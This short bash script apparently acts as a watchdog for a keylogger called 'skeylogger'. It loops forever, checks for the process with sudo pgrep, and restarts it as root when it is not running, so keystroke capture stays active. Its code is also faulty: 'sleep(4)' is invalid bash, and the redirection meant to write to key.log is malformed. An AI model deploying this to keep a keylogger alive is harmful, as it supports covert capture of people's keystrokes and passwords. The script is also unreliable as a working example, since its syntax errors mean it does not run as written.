while true; do
    n=`sudo pgrep skeylogger`
    if [[ -z "$n" ]]; then
        echo "skeylogger is not running"
        sudo /home/cpp/logger/trunk/skeylogger 2>&1 /home/cpp/logger/trunk/key.log
        sleep(4)
        # must sleep for a while to wait for the program to be started,
        # otherwise may cause mutilple process
        elif [[ -n "$n" ]]; then
        echo "skeylogger is  running"
    fi
    sleep 3
done
